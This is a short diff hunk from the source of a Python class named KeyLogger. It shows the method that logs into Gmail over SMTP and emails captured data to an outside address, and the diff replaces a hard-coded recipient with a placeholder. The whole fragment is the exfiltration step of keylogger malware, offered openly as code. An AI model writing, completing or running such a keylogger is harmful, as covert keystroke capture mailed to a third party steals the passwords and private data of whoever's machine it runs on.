@@ -47,7 +47,7 @@ class KeyLogger:
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
         server.login(self.email, self.password)
-        server.sendmail(self.email, "fiwohid263@sartess.com", message)
+        server.sendmail(self.email, "emailherelord", message)
         server.quit()
 
     def generate_filename(self):
